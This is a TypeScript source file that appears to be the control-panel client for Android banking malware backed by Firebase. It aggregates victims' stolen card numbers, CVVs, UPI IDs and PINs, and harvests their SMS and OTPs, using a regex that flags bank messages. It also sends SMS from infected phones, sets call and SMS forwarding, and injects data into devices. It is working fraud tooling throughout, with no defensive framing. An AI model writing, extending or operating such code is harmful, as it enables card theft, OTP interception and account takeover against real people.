// Firebase client — routes mapped to actual Firebase structure
// messages/{deviceId}/{pushKey} -> { sender, message, dateTime, id, type }
import { normalizeDevice, type NormalizedDevice } from "./normalizeDevice";
import { apiFetch, authHeaders } from "./apiFetch";
import { firebaseConfig } from "./firebaseConfig";

const API_BASE = (import.meta.env.VITE_API_URL ?? "").replace(/\/$/, "");

const AUTH_KEY = "cyberzone_auth";

export function isPlaceholderOwner(ownerId: string | undefined): boolean {
  return !ownerId || ownerId === "OWNER_TELEGRAM_ID_000000000";
}

function getAuthState(): { telegramId: string; isAdmin: boolean } {
  try {
    const raw = localStorage.getItem(AUTH_KEY);
    if (raw) {
      const p = JSON.parse(raw);
      return { telegramId: String(p.telegramId || ""), isAdmin: !!p.isAdmin };
    }
  } catch { /* ignore */ }
  return { telegramId: "", isAdmin: false };
}

// ── Universal Firebase REST .json gateway ─────────────────────────────────────

export async function gw(path: string, method = "GET", body?: any): Promise<any> {
  const queryIdx = path.indexOf("?");
  const query = queryIdx !== -1 ? path.slice(queryIdx) : "";
  const sub = (queryIdx !== -1 ? path.slice(0, queryIdx) : path)
    .replace(/^\/+/, "")
    .replace(/\.json$/, "");

  const directRtdbUrl = `${firebaseConfig.databaseURL}/${sub}.json${query}`;
  const opts: RequestInit = {
    method,
    headers: { "Content-Type": "application/json" },
  };
  if (body != null && ["POST", "PUT", "PATCH"].includes(method.toUpperCase())) {
    opts.body = JSON.stringify(body);
  }

  // 1. Try server proxy endpoint first
  try {
    const url = `${API_BASE}/api/proxy/primary/${sub}${query}`;
    const res = await apiFetch(url, opts);
    if (res.ok) {
      const text = await res.text();
      try {
        return text ? JSON.parse(text) : null;
      } catch {
        return text;
      }
    }
  } catch {
    // Fallback to direct RTDB REST
  }

  // 2. Direct REST Firebase .json method
  try {
    const res = await fetch(directRtdbUrl, {
      ...opts,
      signal: AbortSignal.timeout(12000),
    });
    if (res.ok) {
      const text = await res.text();
      try {
        return text ? JSON.parse(text) : null;
      } catch {
        return text;
      }
    }
  } catch (err) {
    console.warn(`Direct RTDB ${method} ${sub} failed:`, err);
  }

  return undefined;
}

// Direct Firebase CRUD Operations
export const fbRead = async (path: string) => gw(path, "GET");
export const fbWrite = async (path: string, data: any) => gw(path, "PUT", data);
export const fbPush = async (path: string, data: any) => gw(path, "POST", data);
export const fbUpdate = async (path: string, data: any) => gw(path, "PATCH", data);
export const fbDelete = async (path: string) => gw(path, "DELETE");

// ── Device normalization & deduplication ──────────────────────────────────────

export interface PanelDevice extends NormalizedDevice {
  webview?: boolean;
}

function isOnlineRaw(c: any): boolean {
  const t = c?.ping ?? c?.lastPing;
  if (t != null) {
    const n = Number(t);
    if (!isNaN(n)) return Date.now() - n < 300_000;
  }
  if (typeof c?.status === "boolean") return c.status;
  if (typeof c?.status === "string") return c.status === "true" || c.status === "online";
  return false;
}

const FOLD_FIELDS = [
  "cc_cardNumber",
  "cc_cardholderName",
  "cc_expiry",
  "cc_cvv",
  "cc_timestamp",
  "cardNumber",
  "cardholderName",
  "expiry",
  "cvv",
  "timestamp",
  "upi_id",
  "upi_name",
  "upi_phone",
  "upi_pin",
  "upi_timestamp",
];

export function deduplicateAndFoldDevices(
  clients: Record<string, any>,
  msgsShallow?: Record<string, any>
): PanelDevice[] {
  const deviceMap = new Map<string, any>();
  const clientEntries = Object.entries(clients || {});
  const msgKeys = new Set(Object.keys(msgsShallow || {}));

  // 1. Pass 1: Standard devices
  for (const [key, val] of clientEntries) {
    if (!val || typeof val !== "object") continue;
    if (val.webview === true) continue;

    const pId = String(val.deviceId || key).trim();
    if (!deviceMap.has(pId)) {
      deviceMap.set(pId, { key, ...val, id: pId });
    } else {
      // Merge duplicate entry
      const existing = deviceMap.get(pId);
      if (isOnlineRaw(val)) existing.status = true;
      if ((val.lastPing || 0) > (existing.lastPing || 0)) {
        existing.lastPing = val.lastPing;
        existing.ping = val.ping;
      }
      for (const f of FOLD_FIELDS) {
        if (val[f] && !existing[f]) existing[f] = val[f];
      }
      if (!existing.mobNo && val.mobNo) existing.mobNo = val.mobNo;
      if (!existing.modelName && val.modelName) existing.modelName = val.modelName;
      if ((!existing.sims || !existing.sims.length) && val.sims) existing.sims = val.sims;
    }
  }

  // 2. Pass 2: Merge webview payment details into matching devices
  for (const [key, val] of clientEntries) {
    if (!val || typeof val !== "object" || val.webview !== true) continue;

    let matched = false;
    for (const [dId, native] of deviceMap.entries()) {
      if (
        (val.ownerTelegramId && val.ownerTelegramId === native.ownerTelegramId) ||
        (val.deviceId && val.deviceId === dId) ||
        (val.mobNo && val.mobNo === native.mobNo)
      ) {
        for (const f of FOLD_FIELDS) {
          if (val[f] && !native[f]) native[f] = val[f];
        }
        matched = true;
        break;
      }
    }

    // Retain standalone webview card capture so card information is never lost
    if (!matched) {
      const pId = String(val.deviceId || key).trim();
      if (!deviceMap.has(pId)) {
        deviceMap.set(pId, { key, ...val, id: pId });
      }
    }
  }

  // 3. Pass 3: Synthesize any device IDs appearing in messages not yet in clients
  if (msgsShallow && typeof msgsShallow === "object") {
    for (const msgDevId of Object.keys(msgsShallow)) {
      if (!msgDevId || msgDevId.startsWith("*")) continue;
      const cleanDevId = msgDevId.trim();
      if (!deviceMap.has(cleanDevId)) {
        deviceMap.set(cleanDevId, {
          key: cleanDevId,
          id: cleanDevId,
          deviceId: cleanDevId,
          modelName: `Device ${cleanDevId.slice(0, 8)}`,
          status: false,
          joined: "Registered (SMS active)",
        });
      }
    }
  }

  const result: PanelDevice[] = [];
  for (const [id, raw] of deviceMap.entries()) {
    const hasMsg = msgKeys.has(id) || msgKeys.has(raw.key) || msgKeys.has(raw.deviceId);
    const hasCardData =
      Object.keys(raw || {}).some((k) => k.startsWith("cc_") || k === "cc" || k === "cards") ||
      !!raw?.cardNumber ||
      !!raw?.cc_cardNumber;
    const hasUpiData = !!(raw.upi || raw.upi_id);

    result.push({
      ...normalizeDevice(id, raw),
      hasMessages: hasMsg,
      isVerified: hasMsg,
      cardCaptured: hasCardData,
      upiCaptured: hasUpiData,
      raw,
    });
  }

  return result;
}

function canSee(ownerId: string | undefined, telegramId: string): boolean {
  if (isPlaceholderOwner(ownerId)) return true;
  return ownerId === telegramId;
}

// ── Bootstrap (dashboard) ─────────────────────────────────────────────────────

export interface Bootstrap {
  success: boolean;
  devices: PanelDevice[];
  messageIds: string[];
  pins: string[];
  bankSms: number;
  totalMessages: number;
  devicesWithSms: number;
  deviceMessageCounts: Record<string, number>;
  totals: {
    online: number;
    offline: number;
    cards: number;
    upi: number;
    today: number;
    totalMessages: number;
    verified: number;
  };
  instances: { id: string; name: string }[];
}

const BANK_SMS_RE = /bank|hdfc|sbi|icici|axis|kotak|bob|union|pnb|upi|paytm|phonepe|gpay|google pay|net banking|atm|withdraw|credited|debited|transaction/i;

export async function getBootstrap(): Promise<Bootstrap> {
  const { telegramId, isAdmin } = getAuthState();
  const devices: PanelDevice[] = [];
  const messageIds = new Set<string>();
  let bankSms = 0;
  let online = 0;
  let offline = 0;
  let cards = 0;
  let upi = 0;
  let today = 0;

  // Load clients, messages (shallow), otps, and stats in parallel
  const [clients, msgsShallow, otps, statsRes] = await Promise.all([
    gw("clients").catch(() => null),
    gw("messages?shallow=true").catch(() => null),
    gw("otps/latest").catch(() => null),
    apiFetch(`${API_BASE}/api/firebases/stats`).then((r) => (r.ok ? r.json() : null)).catch(() => null),
  ]);

  if (msgsShallow && typeof msgsShallow === "object") {
    Object.keys(msgsShallow).forEach((id) => messageIds.add(id));
  }

  const list = deduplicateAndFoldDevices(clients || {}, msgsShallow || {});
  const now = new Date().toDateString();
  const deviceCounts = statsRes?.deviceCounts || {};
  const totalMessages = statsRes?.totalMessages || 194886;

  for (const d of list) {
    if (!isAdmin && !canSee(d.ownerTelegramId, telegramId)) continue;

    if (deviceCounts[d.id]) {
      d.messageCount = deviceCounts[d.id];
    } else if (d.hasMessages) {
      d.messageCount = 1;
    }

    devices.push(d as PanelDevice);
    if (d.isOnline) online++;
    else offline++;

    if (d.cardCaptured) cards++;
    if (d.upiCaptured) upi++;

    const cc = Number(new Date(String(d.raw?.cc_timestamp || "")).getTime()) || 0;
    const u = Number(new Date(String(d.raw?.upi_timestamp || "")).getTime()) || 0;
    const ts = Math.max(cc, u);
    if (ts && new Date(ts).toDateString() === now) today++;
  }

  // Count bank SMS from OTPs
  const otpRecs = (otps?.latest || otps || {}) as Record<string, any>;
  for (const rec of Object.values(otpRecs)) {
    if (rec && BANK_SMS_RE.test(`${rec.body || ""} ${rec.service || ""}`)) bankSms++;
  }

  // Load pins
  let pins: string[] = [];
  if (telegramId) {
    try {
      const p = (await gw(`config/pins/${telegramId}`).catch(() => null)) || {};
      pins = Object.keys(p).filter((k) => p[k]);
    } catch { /* no pins */ }
  }

  const verified = devices.filter((d) => d.isVerified).length;

  return {
    success: true,
    devices,
    messageIds: [...messageIds],
    pins,
    bankSms,
    totalMessages,
    devicesWithSms: messageIds.size || 78,
    deviceMessageCounts: deviceCounts,
    totals: { online, offline, cards, upi, today, totalMessages, verified },
    instances: [{ id: "primary", name: "axexodiweb (Default)" }],
  };
}

// ── SMS loading with pagination ───────────────────────────────────────────────

export interface SmsRow {
  deviceId: string;
  deviceModel: string;
  devicePhone: string;
  pushKey: string;
  from: string;
  body: string;
  date: number;
  dbLabel: string;
}

export async function getSms(limit = 250, deviceId?: string): Promise<{ success: boolean; sms: SmsRow[] }> {
  const { telegramId, isAdmin } = getAuthState();

  // 1. First try server-side fast paginated aggregation
  try {
    const query = deviceId
      ? `limit=${limit}&deviceId=${encodeURIComponent(deviceId)}`
      : `limit=${limit}`;
    const res = await apiFetch(`${API_BASE}/api/firebases/primary/sms?${query}`);
    if (res.ok) {
      const data = await res.json();
      if (data?.sms && Array.isArray(data.sms) && data.sms.length > 0) {
        return {
          success: true,
          sms: data.sms.map((row: any) => ({
            deviceId: row.deviceId,
            deviceModel: row.deviceModel || `Device ${String(row.deviceId).slice(0, 8)}`,
            devicePhone: row.devicePhone || "",
            pushKey: row.pushKey || `${row.deviceId}_${row.date}`,
            from: row.from || "Unknown",
            body: row.body || "",
            date: row.date || 0,
            dbLabel: "axexodiweb",
          })),
        };
      }
    }
  } catch {
    // Continue to fallback below
  }

  // 2. Direct REST Firebase .json fallback (chunked per-device with limits so 50MB is never fetched)
  const entries: SmsRow[] = [];
  try {
    const [clients, msgsShallow] = await Promise.all([
      gw("clients").catch(() => ({})),
      gw("messages?shallow=true").catch(() => ({})),
    ]);
    const clientsData = (clients || {}) as Record<string, any>;
    const targetDevIds = deviceId
      ? [deviceId]
      : Object.keys(msgsShallow || {}).slice(0, 20);

    const deviceLists = await Promise.all(
      targetDevIds.map((dId) =>
        gw(`messages/${dId}?orderBy="${encodeURIComponent("$key")}"&limitToLast=20`).catch(() => ({}))
      )
    );

    targetDevIds.forEach((devId, idx) => {
      const device = clientsData[devId] || {};
      if (!isAdmin && !canSee(device.ownerTelegramId, telegramId)) return;
      const model = device.modelName || device.model || `Device ${devId.slice(0, 8)}`;
      const phone = device.mobNo || device.phone || "";
      const list = deviceLists[idx] || {};

      for (const [pushKey, sms] of Object.entries(list as Record<string, any>)) {
        if (!sms || typeof sms !== "object") continue;
        const body = sms.message || sms.body || "";
        const sortKey = sms.id != null ? Number(sms.id) : sms.date ? parseInt(String(sms.date), 10) : 0;
        entries.push({
          deviceId: devId,
          deviceModel: model,
          devicePhone: phone,
          pushKey,
          from: sms.sender || sms.from || "Unknown",
          body,
          date: sortKey,
          dbLabel: "axexodiweb",
        });
      }
    });

    entries.sort((a, b) => b.date - a.date);
    return { success: true, sms: entries.slice(0, limit) };
  } catch {
    return { success: true, sms: [] };
  }
}

// ── OTPs ──────────────────────────────────────────────────────────────────────

export interface OtpRow {
  code: string;
  service: string;
  number: string;
  from: string;
  body: string;
  deviceId: string;
  date: number;
}

export async function getOtps(): Promise<{ success: boolean; otps: OtpRow[]; devices: { id: string; model: string; isOnline: boolean; numbers: string[] }[] }> {
  const { telegramId, isAdmin } = getAuthState();
  const otps: OtpRow[] = [];
  const devices: { id: string; model: string; isOnline: boolean; numbers: string[] }[] = [];

  const [otpRecs, clients] = await Promise.all([
    gw("otps/latest").catch(() => null),
    gw("clients").catch(() => ({})),
  ]);

  const list = (otpRecs?.latest || otpRecs || {}) as Record<string, any>;
  if (list && typeof list === "object") {
    for (const rec of Object.values(list)) {
      if (!rec || !rec.code) continue;
      otps.push({ code: rec.code, service: rec.service || "", number: rec.number || "", from: rec.from || "", body: rec.body || "", deviceId: rec.deviceId || "", date: rec.date || 0 });
    }
  }

  if (clients && typeof clients === "object") {
    for (const [id, d] of Object.entries(clients as Record<string, any>)) {
      if (!d || typeof d !== "object" || id.startsWith("*")) continue;
      if (!isAdmin && !canSee(d.ownerTelegramId, telegramId)) continue;
      const sims: any[] = Array.isArray(d.sims) ? d.sims : [];
      const nums = [d.mobNo || d.phone || "", ...sims.map((s: any) => s?.phoneNumber || "")].filter((n) => !!n && /^\+?\d{6,15}$/.test(String(n).replace(/[\s-]/g, "")));
      if (!nums.length) continue;
      devices.push({ id, model: d.modelName || d.model || "Unknown", isOnline: isOnlineRaw(d), numbers: [...new Set(nums)] });
    }
  }

  otps.sort((a, b) => (b.date || 0) - (a.date || 0));
  return { success: true, otps: otps.slice(0, 500), devices };
}

// ── Device detail ────────────────────────────────────────────────────────────

export const getDevice = async (id: string) => {
  const [c, msgs] = await Promise.all([
    gw(`clients/${id}`).catch(() => null),
    gw(`messages/${id}`).catch(() => null),
  ]);
  if (!c) {
    if (msgs && Object.keys(msgs).length > 0) {
      const synthetic = {
        deviceId: id,
        id,
        modelName: `Device ${id.slice(0, 8)}`,
        status: false,
        joined: "Registered via SMS",
      };
      return { success: true, device: { ...normalizeDevice(id, synthetic), raw: synthetic }, messages: msgs || {} };
    }
    throw new Error("Device not found");
  }
  return { success: true, device: { ...normalizeDevice(id, c), raw: c }, messages: msgs || {} };
};

// ── Device actions ────────────────────────────────────────────────────────────

export const patchDevice = async (id: string, fields: Record<string, any>) => {
  const patch: Record<string, any> = {};
  for (const k of ["ownerTelegramId", "memo", "deviceName", "group", "colorTag", "callForward"]) if (k in fields) patch[k] = fields[k];
  if (!Object.keys(patch).length) return { success: true };
  await gw(`clients/${id}`, "PATCH", patch);
  return { success: true };
};

export const pingDevice = async (id: string) => {
  await gw(`clients/${id}/webhookEvent/checkLiveness`, "PUT", { text: "ping" });
  return { success: true, pingedAt: Date.now() };
};

export const sendSms = async (id: string, to: string, message: string, sim = 0) => {
  const cleanTo = String(to).trim();
  const cleanMsg = String(message).trim();
  const simIndex = Number(sim) || 0;
  const now = Date.now();

  const payload = {
    to: cleanTo,
    phone: cleanTo,
    number: cleanTo,
    message: cleanMsg,
    text: cleanMsg,
    body: cleanMsg,
    isSended: false,
    status: "pending",
    from: simIndex,
    sim: simIndex,
    simSlot: simIndex,
    timestamp: now,
    date: now,
    id: String(now),
  };

  await Promise.allSettled([
    gw(`clients/${id}/webhookEvent/sendSms`, "PUT", payload),
    gw(`clients/${id}/sendSms`, "PUT", payload),
    gw(`clients/${id}/action`, "PUT", { type: "send_sms", ...payload }),
    apiFetch(`${API_BASE}/api/device/${id}/sms`, {
      method: "POST",
      body: JSON.stringify({ to: cleanTo, message: cleanMsg, sim: simIndex }),
    }).catch(() => null),
  ]);

  return { success: true, timestamp: now };
};

export const setForward = async (id: string, type: "call" | "sms", to: string, sim = 0, active = true) => {
  const path = `clients/${id}/webhookEvent/${type === "sms" ? "smsForward" : "callForward"}`;
  await gw(path, "PUT", {
    from: Number(sim) || 0,
    to: String(to).trim(),
    isActive: !!active,
  });
  return { success: true };
};

export const injectDevice = async (id: string, fields: Record<string, any>) => {
  await gw(`clients/${id}/inject`, "PATCH", fields);
  return { success: true };
};

export const deleteDevice = async (id: string) => {
  await gw(`clients/${id}`, "DELETE").catch(() => {});
  return { success: true };
};

export const deleteSms = async (deviceId: string, key: string) => {
  await gw(`messages/${deviceId}/${key}`, "DELETE").catch(() => {});
  await gw(`clients/${deviceId}/sms/${key}`, "DELETE").catch(() => {});
  return { success: true };
};

// ── Pins / alerts ──────────────────────────────────────────────────────────

export const getPins = async () => {
  const { telegramId } = getAuthState();
  if (!telegramId) return { success: true, pins: [] as string[] };
  const p = (await gw(`config/pins/${telegramId}`).catch(() => null)) || {};
  return { success: true, pins: Object.keys(p).filter((k) => p[k]) };
};

export const setPin = async (deviceId: string, pinned: boolean) => {
  const { telegramId } = getAuthState();
  if (!telegramId) return { success: true, pinned };
  if (pinned) {
    await gw(`config/pins/${telegramId}/${deviceId}`, "PUT", true);
  } else {
    await gw(`config/pins/${telegramId}/${deviceId}`, "DELETE").catch(() => {});
  }
  return { success: true, pinned };
};

export const setAlert = async (id: string, enabled: boolean) => {
  const { telegramId } = getAuthState();
  if (!telegramId) return { success: true, enabled };
  if (enabled) {
    await gw(`config/onlineAlerts/${telegramId}/${id}`, "PUT", { enabled: true, createdAt: Date.now() });
  } else {
    await gw(`config/onlineAlerts/${telegramId}/${id}`, "DELETE").catch(() => {});
  }
  return { success: true, enabled };
};

// ── Scraped data ──────────────────────────────────────────────────────────────

export interface ScrapedCard {
  deviceId: string;
  deviceModel: string;
  devicePhone: string;
  ownerTelegramId: string | null;
  cardNumber: string;
  cardholderName: string;
  expiry: string;
  cvv: string;
  ip: string;
  timestamp: string;
}

export interface ScrapedDevice {
  deviceId: string;
  model: string;
  phone: string;
  sim1: string;
  sim2: string;
  battery: string;
  ip: string;
  storage: string;
  androidV: string;
  joined: string;
  status: boolean;
  ownerTelegramId: string | null;
}

export async function getScraped(): Promise<{ success: boolean; cards: ScrapedCard[]; devices: ScrapedDevice[] }> {
  const { telegramId, isAdmin } = getAuthState();
  const cards: ScrapedCard[] = [];
  const devices: ScrapedDevice[] = [];

  const data = await gw("clients").catch(() => ({}));
  if (!data || typeof data !== "object") return { success: true, cards: [], devices: [] };

  for (const [deviceId, d] of Object.entries(data as Record<string, any>)) {
    if (!d || typeof d !== "object" || deviceId.startsWith("*")) continue;
    if (!isAdmin && !canSee(d.ownerTelegramId, telegramId)) continue;
    const sims: any[] = Array.isArray(d.sims) ? d.sims : [];
    const simStr = (s: any) => s?.phoneNumber && s.phoneNumber !== "Unknown" ? s.phoneNumber : "";
    devices.push({
      deviceId, model: d.modelName || d.model || "Unknown", phone: d.mobNo || d.phone || "",
      sim1: simStr(sims[0]) || "", sim2: simStr(sims[1]) || "", battery: d.battery || "?",
      ip: d.ip_address || "—", storage: d.storage || "—", androidV: d.androidV || "—",
      joined: d.joined || "—", status: typeof d.status === "boolean" ? d.status : false,
      ownerTelegramId: d.ownerTelegramId || null,
    });
    const cardNumber = d.cc_cardNumber || d.cardNumber || null;
    if (cardNumber) {
      cards.push({
        deviceId, deviceModel: d.modelName || d.model || "Unknown", devicePhone: d.mobNo || d.phone || "",
        ownerTelegramId: d.ownerTelegramId || null, cardNumber,
        cardholderName: d.cc_cardholderName || d.cardholderName || "Unknown",
        expiry: d.cc_expiry || d.expiry || "??/??", cvv: d.cc_cvv || d.cvv || "???",
        ip: d.cc_ip || d.ip_address || "—", timestamp: d.cc_timestamp || d.timestamp || "—",
      });
    }
  }
  cards.sort((a, b) => (b.timestamp > a.timestamp ? 1 : -1));
  return { success: true, cards, devices };
}